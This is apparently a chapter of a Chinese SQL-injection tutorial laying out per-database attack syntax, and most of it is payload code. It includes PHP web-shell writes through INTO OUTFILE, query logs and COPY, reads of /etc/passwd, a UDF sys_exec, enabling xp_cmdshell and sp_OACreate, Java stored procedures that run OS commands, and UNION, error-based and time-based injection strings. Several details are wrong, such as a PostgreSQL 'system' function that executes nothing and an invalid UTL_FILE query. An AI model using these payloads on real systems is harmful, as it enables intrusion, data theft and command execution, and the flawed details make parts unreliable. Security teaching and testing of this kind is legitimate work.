# 第四章：多数据库语法差异详解

## 4.1 MySQL特性与语法

### 系统函数与信息Schema

#### 信息查询函数
```sql
-- 版本信息
SELECT @@version;
SELECT version();

-- 当前数据库
SELECT database();
SELECT schema();

-- 当前用户
SELECT user();
SELECT current_user();
SELECT system_user();

-- 服务器信息
SELECT @@hostname;
```

#### 信息Schema查询
```sql
-- 获取所有数据库
SELECT schema_name FROM information_schema.schemata;

-- 获取当前数据库的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- 获取指定表的所有列
SELECT column_name FROM information_schema.columns 
WHERE table_schema = database() AND table_name = 'users';

-- 获取表结构详情
SELECT table_name, column_name, data_type 
FROM information_schema.columns 
WHERE table_schema = database();
```

#### 系统变量查询
```sql
-- 重要系统变量
SELECT @@version_compile_os;  -- 操作系统
SELECT @@datadir;            -- 数据目录
SELECT @@basedir;            -- 安装目录
SELECT @@secure_file_priv;   -- 文件读写权限
```

### 注释特性与语法限制

#### 注释语法
```sql
-- 单行注释
SELECT * FROM users; -- 这是注释
SELECT * FROM users; # 这也是注释（MySQL特有）

-- 多行注释
SELECT * FROM /* 这是多行注释 */ users;

-- 内联注释（版本特定功能）
SELECT /*!32302 1/0, */ 1 FROM users;  -- 仅MySQL 3.23.02以上执行
SELECT /*!50001 SELECT * FROM users */; -- 仅5.00.01以上版本执行
```

#### 语法特性
```sql
-- 字符串连接
SELECT CONCAT('a', 'b', 'c');        -- 'abc'
SELECT CONCAT_WS('-', 'a', 'b', 'c'); -- 'a-b-c'
SELECT GROUP_CONCAT(username) FROM users; -- 多行合并

-- 限制查询结果
SELECT * FROM users LIMIT 1;      -- 第一行
SELECT * FROM users LIMIT 1,1;    -- 第二行（偏移1，取1行）
SELECT * FROM users LIMIT 0,10;   -- 前10行
```

### 文件读写与UDF利用

#### 文件读取
```sql
-- 读取文件内容
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/win.ini');

-- 条件读取（避免NULL）
SELECT LOAD_FILE('/etc/passwd') WHERE 1=1;

-- 十六进制路径（绕过过滤）
SELECT LOAD_FILE(0x2F6574632F706173737764); -- /etc/passwd的十六进制
```

#### 文件写入
```sql
-- 写入文件（需要FILE权限）
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php';

-- 替代写法
SELECT 'data' INTO DUMPFILE '/path/to/file';

-- 联合查询写入
UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php'
```

#### UDF（用户定义函数）利用
```sql
-- 检查UDF是否已存在
SELECT * FROM mysql.func WHERE name = 'sys_exec';

-- 创建UDF函数（需要插件目录写入权限）
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

-- 执行系统命令
SELECT sys_exec('id');
SELECT sys_eval('whoami');

-- Windows系统命令执行
SELECT sys_exec('cmd /c whoami');
```

#### 系统命令执行替代方法
```sql
-- 通过日志文件执行
SET global general_log_file='/var/www/shell.php';
SET global general_log = on;
SELECT '<?php system($_GET[cmd]); ?>';
SET global general_log = off;

-- 通过慢查询日志
SET global slow_query_log_file='/var/www/shell.php';
SET global slow_query_log=1;
SELECT '<?php system($_GET[cmd]); ?>' FROM mysql.user WHERE SLEEP(11);
```

## 4.2 PostgreSQL特性与语法

### 系统目录查询

#### 信息查询函数
```sql
-- 版本信息
SELECT version();

-- 当前数据库
SELECT current_database();
SELECT current_schema();

-- 当前用户
SELECT current_user;
SELECT session_user;
SELECT user;

-- 服务器信息
SELECT inet_server_addr();  -- 服务器IP
SELECT inet_server_port();  -- 服务器端口
```

#### 系统目录查询
```sql
-- 获取所有数据库
SELECT datname FROM pg_database;

-- 获取当前数据库的所有表
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- 获取指定表的所有列
SELECT column_name FROM information_schema.columns 
WHERE table_schema = 'public' AND table_name = 'users';

-- 替代查询方式
SELECT attname FROM pg_attribute 
WHERE attrelid = (SELECT oid FROM pg_class WHERE relname = 'users') 
AND attnum > 0;

-- 获取表结构详情
SELECT table_name, column_name, data_type 
FROM information_schema.columns 
WHERE table_schema = 'public';
```

### 字符串处理差异

#### 字符串连接
```sql
-- 字符串连接操作符
SELECT 'a' || 'b' || 'c';        -- 'abc'

-- 字符串函数
SELECT CONCAT('a', 'b', 'c');    -- 'abc'
SELECT 'a' || CHR(98) || 'c';    -- 'abc' (CHR为ASCII转换)

-- 多行合并
SELECT string_agg(username, ',') FROM users;
```

#### 字符串处理函数
```sql
-- 字符串截取
SELECT SUBSTRING('abcdef' FROM 2 FOR 3);  -- 'bcd'
SELECT SUBSTR('abcdef', 2, 3);           -- 'bcd'

-- 字符串长度
SELECT LENGTH('abc');    -- 3
SELECT CHAR_LENGTH('abc'); -- 3

-- 大小写转换
SELECT LOWER('ABC');     -- 'abc'
SELECT UPPER('abc');     -- 'ABC'
```

### 大对象文件操作

#### 大对象操作函数
```sql
-- 创建大对象
SELECT lo_import('/etc/passwd');

-- 列出大对象
SELECT oid FROM pg_largeobject;

-- 读取大对象内容
SELECT lo_get(oid_column) FROM pg_largeobject WHERE oid = 12345;

-- 导出大对象到文件
SELECT lo_export(12345, '/tmp/passwd_copy');

-- 删除大对象
SELECT lo_unlink(12345);
```

#### 文件读写操作
```sql
-- 读取文件（需要超级用户权限）
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 1000); -- 读取前1000字节

-- 列出目录（需要权限）
SELECT pg_ls_dir('/etc');

-- 写入文件（极其有限的权限）
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/shell.php';

-- 通过表文件操作
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
```

#### 命令执行方法
```sql
-- 通过COPY命令执行（老版本）
COPY cmd_exec FROM PROGRAM 'whoami';

-- 通过大对象和PL/pgSQL（需要创建权限）
CREATE OR REPLACE FUNCTION system(cmd text) RETURNS int AS $$
BEGIN
    RETURN 0;
END;
$$ LANGUAGE plpgsql;

SELECT system('whoami');
```

## 4.3 SQL Server特性与语法

### 系统表查询

#### 信息查询函数
```sql
-- 版本信息
SELECT @@version;

-- 当前数据库
SELECT DB_NAME();
SELECT DB_NAME(1);  -- 第二个数据库

-- 当前用户
SELECT SUSER_NAME();
SELECT SYSTEM_USER;
SELECT CURRENT_USER;

-- 服务器信息
SELECT @@SERVERNAME;
SELECT HOST_NAME();
```

#### 系统表查询
```sql
-- 获取所有数据库
SELECT name FROM master..sysdatabases;
SELECT name FROM sys.databases;

-- 获取当前数据库的所有表
SELECT name FROM sysobjects WHERE xtype = 'U';  -- 用户表
SELECT name FROM sys.tables;

-- 获取指定表的所有列
SELECT name FROM syscolumns WHERE id = OBJECT_ID('users');
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- 获取表结构详情
SELECT t.name AS table_name, c.name AS column_name, ty.name AS data_type
FROM sys.tables t 
JOIN sys.columns c ON t.object_id = c.object_id
JOIN sys.types ty ON c.user_type_id = ty.user_type_id;
```

### 错误消息利用

#### 报错注入技术
```sql
-- 类型转换错误
SELECT 1 + 'a';  -- 触发转换错误
SELECT CONVERT(int, (SELECT user));  -- 报错显示用户信息

-- 利用CONVERT函数
SELECT CONVERT(int, @@version);
SELECT CAST(@@version AS int);

-- 利用XML解析错误
SELECT (SELECT '@'+name FROM sys.databases FOR XML PATH(''));

-- 利用除零错误
SELECT 1/0 WHERE (SELECT user) = 'sa';
```

#### 高级报错注入
```sql
-- 使用CONVERT和子查询
SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.databases));

-- 使用聚合函数报错
SELECT (SELECT 'a' WHERE 1=1 GROUP BY (SELECT @@version));

-- 使用JOIN报错
SELECT * FROM (SELECT @@version as v) a JOIN (SELECT @@version as v) b ON 1=1;
```

### xp_cmdshell利用

#### xp_cmdshell启用与使用
```sql
-- 检查xp_cmdshell是否启用
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- 启用xp_cmdshell（需要管理员权限）
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行系统命令
EXEC xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'ipconfig';

-- 执行命令并获取输出
CREATE TABLE #output (line varchar(8000));
INSERT INTO #output EXEC xp_cmdshell 'whoami';
SELECT * FROM #output;
DROP TABLE #output;
```

#### 替代命令执行方法
```sql
-- 使用sp_OACreate（需要启用Ole Automation Procedures）
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';

-- 使用CLR集成（需要权限）
CREATE ASSEMBLY [System_Security]
FROM 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Security.dll'
WITH PERMISSION_SET = UNSAFE;
```

#### 文件操作
```sql
-- 读取文件（需要权限）
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\boot.ini', SINGLE_BLOB) AS x;

-- 使用xp_cmdshell读取文件
EXEC xp_cmdshell 'type C:\boot.ini';

-- 写入文件
EXEC xp_cmdshell 'echo test > C:\test.txt';
```

## 4.4 Oracle特性与语法

### 数据字典查询

#### 信息查询函数
```sql
-- 版本信息
SELECT banner FROM v$version;
SELECT * FROM product_component_version;

-- 当前数据库
SELECT name FROM v$database;
SELECT global_name FROM global_name;

-- 当前用户
SELECT user FROM dual;
SELECT sys_context('USERENV', 'SESSION_USER') FROM dual;

-- 服务器信息
SELECT host_name FROM v$instance;
SELECT sys_context('USERENV', 'IP_ADDRESS') FROM dual;
```

#### 数据字典查询
```sql
-- 获取所有用户
SELECT username FROM all_users;
SELECT username FROM dba_users;  -- 需要DBA权限

-- 获取当前用户的所有表
SELECT table_name FROM user_tables;

-- 获取所有可访问的表
SELECT table_name FROM all_tables;

-- 获取指定表的所有列
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';

-- 获取表结构详情
SELECT table_name, column_name, data_type, data_length 
FROM all_tab_columns 
WHERE owner = (SELECT user FROM dual);
```

### 双引号处理

#### 标识符引用
```sql
-- 大小写敏感（使用双引号）
SELECT * FROM "Users";      -- 表名精确匹配
SELECT * FROM users;        -- 自动转换为大写：USERS

-- 特殊字符表名
SELECT * FROM "my-table";   -- 包含连字符的表名
SELECT * FROM "user table"; -- 包含空格的表名

-- 在注入中的利用
' UNION SELECT * FROM "SYS"."USERS" -- 
' AND EXISTS(SELECT * FROM "ALL_TABLES" WHERE "TABLE_NAME"='USERS') -- 
```

#### 字符串处理
```sql
-- 字符串连接
SELECT 'a' || 'b' || 'c' FROM dual;        -- 'abc'
SELECT CONCAT('a', 'b') FROM dual;         -- 'ab' (只能两个参数)

-- 字符串函数
SELECT SUBSTR('abcdef', 2, 3) FROM dual;   -- 'bcd'
SELECT LENGTH('abc') FROM dual;            -- 3
SELECT LOWER('ABC') FROM dual;             -- 'abc'
SELECT UPPER('abc') FROM dual;             -- 'ABC'
```

### PL/SQL注入特性

#### PL/SQL代码注入
```sql
-- 在匿名块中注入
BEGIN
    EXECUTE IMMEDIATE 'SELECT * FROM ' || 'users';
END;

-- 利用DBMS_UTILITY
EXEC DBMS_UTILITY.EXEC_DDL_STATEMENT('GRANT DBA TO ' || user_input);

-- 利用SYS_CONTEXT
SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') FROM dual;
```

#### 系统命令执行
```sql
-- 使用Java存储过程（需要权限）
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Exec" AS
import java.io.*;
public class Exec {
    public static String runCommand(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String output = "";
            String line;
            while ((line = in.readLine()) != null) {
                output += line + "\n";
            }
            return output;
        } catch (Exception e) {
            return e.getMessage();
        }
    }
};

CREATE OR REPLACE FUNCTION EXECUTE_COMMAND(command IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'Exec.runCommand(java.lang.String) return java.lang.String';

SELECT EXECUTE_COMMAND('whoami') FROM dual;
```

#### 文件操作
```sql
-- 读取文件（需要UTL_FILE权限）
SELECT text FROM TABLE(UTL_FILE.FOPEN('/tmp', 'passwd', 'R'));

-- 使用Java读取文件
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "FileRead" AS
import java.io.*;
import java.sql.*;
public class FileRead {
    public static String readFile(String filename) {
        try {
            BufferedReader br = new BufferedReader(new FileReader(filename));
            String line;
            String content = "";
            while ((line = br.readLine()) != null) {
                content += line + "\n";
            }
            br.close();
            return content;
        } catch (Exception e) {
            return e.getMessage();
        }
    }
};

CREATE OR REPLACE FUNCTION READ_FILE(filename IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'FileRead.readFile(java.lang.String) return java.lang.String';

SELECT READ_FILE('/etc/passwd') FROM dual;
```

## 4.5 SQLite及其他数据库

### SQLite特性

#### 信息查询
```sql
-- 版本信息
SELECT sqlite_version();

-- 数据库列表（ATTACH的数据库）
PRAGMA database_list;

-- 获取所有表
SELECT name FROM sqlite_master WHERE type = 'table';

-- 获取指定表的所有列
PRAGMA table_info(users);
SELECT sql FROM sqlite_master WHERE name = 'users';

-- 获取所有表结构
SELECT name, sql FROM sqlite_master WHERE type = 'table';
```

#### 语法特性
```sql
-- 字符串连接
SELECT 'a' || 'b' || 'c';        -- 'abc'

-- 注释语法
SELECT * FROM users; -- 单行注释
SELECT * FROM /* 多行注释 */ users;

-- 限制查询结果
SELECT * FROM users LIMIT 1;
SELECT * FROM users LIMIT 1 OFFSET 1;

-- 没有信息schema，使用sqlite_master
SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%';
```

#### 文件操作
```sql
-- 读取文件（通过加载扩展）
SELECT load_extension('readfile.dll');
SELECT readfile('/etc/passwd');

-- ATTACH数据库
ATTACH DATABASE '/path/to/other.db' AS other;
SELECT * FROM other.tables;
```

### 其他数据库简要对比

#### MariaDB
```sql
-- 与MySQL高度兼容，但有些特有功能
SELECT @@version;  -- 显示MariaDB版本

-- 特有的系统表
SELECT * FROM information_schema.PROCESSLIST;
```

#### IBM DB2
```sql
-- 版本信息
SELECT * FROM SYSIBM.SYSVERSIONS;

-- 数据库信息
SELECT * FROM SYSCAT.TABLES;

-- 当前用户
SELECT USER FROM SYSIBM.SYSDUMMY1;
```

#### Informix
```sql
-- 版本信息
SELECT DBINFO('version','full') FROM systables WHERE tabid = 1;

-- 数据库信息
SELECT * FROM systables;
```

### 跨数据库通用技巧

#### 通用信息查询模式
```sql
-- 尝试获取版本信息
' UNION SELECT @@version,2,3 -- 
' UNION SELECT version(),2,3 -- 
' UNION SELECT banner,2,3 FROM v$version -- 

-- 尝试获取当前用户
' UNION SELECT user(),2,3 -- 
' UNION SELECT current_user,2,3 -- 
' UNION SELECT user,2,3 FROM dual -- 
```

#### 通用表名猜测
```sql
-- 常见系统表名尝试
' AND EXISTS(SELECT * FROM information_schema.tables) -- MySQL
' AND EXISTS(SELECT * FROM pg_tables) -- PostgreSQL  
' AND EXISTS(SELECT * FROM sysobjects) -- SQL Server
' AND EXISTS(SELECT * FROM all_tables) -- Oracle
' AND EXISTS(SELECT * FROM sqlite_master) -- SQLite
```

#### 延时函数通用测试
```sql
-- 时间盲注通用测试
' AND (SELECT COUNT(*) FROM [table]) = [number] AND [delay_function] -- 

-- 各数据库延时函数：
-- MySQL: SLEEP(5), BENCHMARK(1000000,MD5('test'))
-- PostgreSQL: PG_SLEEP(5)
-- SQL Server: WAITFOR DELAY '0:0:5'
-- Oracle: DBMS_LOCK.SLEEP(5)
```

## 总结

不同数据库在SQL语法、系统函数、信息查询方式等方面存在显著差异。在进行SQL注入攻击时，必须准确识别目标数据库类型，并使用对应的语法和技巧。关键差异总结：

1. **信息查询**：各数据库有不同的系统表和函数
2. **字符串处理**：连接操作符和函数各不相同
3. **注释语法**：虽然大多支持`--`，但细节有差异
4. **文件操作**：权限要求和实现方式差异很大
5. **命令执行**：方法和难度各不相同

掌握这些差异对于成功的SQL注入测试至关重要。

---

**下一章**: [第五章：SQL语句构造艺术](05-SQL语句构造艺术.md)

> 注意：本章内容仅用于安全学习和研究，请在合法授权的环境中进行测试。